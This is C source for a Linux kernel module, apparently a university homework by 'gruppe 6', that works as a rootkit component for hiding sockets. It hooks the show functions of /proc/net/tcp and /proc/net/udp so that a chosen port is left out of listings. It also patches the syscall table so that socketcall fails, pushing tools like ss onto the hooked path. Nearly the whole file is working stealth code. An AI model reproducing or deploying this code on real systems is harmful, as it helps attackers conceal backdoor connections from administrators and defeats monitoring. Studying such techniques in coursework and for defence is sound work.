#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/proc_fs.h>
#include <linux/file.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/net_namespace.h>
#include <linux/socket.h>
#include <linux/types.h>
#include <net/inet_sock.h>
#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);
typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
// type for sys_sendmsg
typedef asmlinkage long (*fun_long_int_struct_msghdr_unsigned)(int, struct msghdr __user*, unsigned);
fun_long_int_struct_msghdr_unsigned orig_sendmsg;
int nr_sys_sendmsg;
typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*);
fun_long_int_unsigned_long orig_socketcall;

fun_ssize_t_int_pvoid_size_t     original_read;
int_filep_voidp_filldir_t proc_original_readdir;
filldir_t original_proc_fillfir;
struct proc_dir_entry *proc;
fun_int_seq_file_void tcp_show_orig;
fun_int_seq_file_void udp_show_orig;

int port_to_hide;
MODULE_PARM_DESC(port_to_hide, "Port to hide.");
module_param(port_to_hide, int, 0000);
char* prot_to_hide;
module_param(prot_to_hide, charp, 0000);

static int hooked_udp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;
    if (strcmp(prot_to_hide, "udp")){
        return udp_show_orig(file, v);
    }
    if (v == SEQ_START_TOKEN) {
        return udp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    OUR_DEBUG("pointer : %p\n", s);
    port = ntohs(s->sport);
    OUR_DEBUG("udp_show port: %d\n", s->sport);
    if (port == port_to_hide){
        return 0;
    } 
    return udp_show_orig(file, v);
}

static int hooked_tcp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;    
    if (strcmp(prot_to_hide, "tcp")){
        return tcp_show_orig(file, v);
    }
    if (v == SEQ_START_TOKEN) {
        return tcp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    OUR_DEBUG("pointer : %p\n", s);
    port = ntohs(s->sport);
    OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
    if (port == port_to_hide){
        return 0;
    } 
    return tcp_show_orig(file, v);
}

asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
    // returning -1 causes ss to try it via /proc/net, which we already hooked
    return -1;
}

void hide_sockets(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table = (void*)ptr_sys_call_table;
    int i;
    while (p){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_show_orig = tcp_seq->seq_ops.show;
            tcp_seq->seq_ops.show = hooked_tcp_show;
        }
        p = p->next;
    }
    p = (struct proc_dir_entry*) init_net.proc_net->subdir;
    udp_seq = 0;
    while (p){
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_show_orig = udp_seq->seq_ops.show;
            udp_seq->seq_ops.show = hooked_udp_show;
            break;
        }
        p = p->next;
    }
    i = 0;
    orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
    make_page_writable((long unsigned int)ptr_sys_call_table);
    syscall_table[__NR_socketcall] = hooked_socketcall;
}

void unhide_sockets(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table;
    while (p && strcmp(p->name, "tcp")!=0){
        p = p->next;
    }
    if (p && tcp_show_orig){
        tcp_seq = p->data;
        tcp_seq->seq_ops.show = tcp_show_orig;
    }
    p = init_net.proc_net->subdir;
    while (p && strcmp(p->name, "udp")!=0){
        p = p->next;
    }
    if (p && udp_show_orig){
        udp_seq = p->data;
        udp_seq->seq_ops.show = udp_show_orig;
    }
    syscall_table = (void**) ptr_sys_call_table;
    syscall_table[__NR_socketcall] = orig_socketcall;
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6, homework 6.\n");
    OUR_DEBUG("%d\n", __NR_socketcall);
    hide_sockets();

    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhide_sockets();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
